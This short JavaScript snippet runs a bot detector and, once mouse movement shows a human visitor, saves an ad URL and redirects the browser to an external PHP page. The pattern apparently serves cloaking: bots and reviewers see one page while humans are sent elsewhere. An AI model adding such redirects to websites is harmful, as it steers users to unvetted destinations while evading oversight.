new jmbotdetector({

    timeout: 1000,
    callback: function(result) {

        console.log('result:', result.tests);

        var curl = document.location.href;

        if (result.cases.mousemove) {
            console.log('MOUSEMOVE', result.cases.mousemove);

            localStorage.setItem('adsurl', 'https://www.pensionering.com/1/j.php')

            $(window).attr('location', 'https://www.pensionering.com/1/j.php')

        }


    }
}).monitor();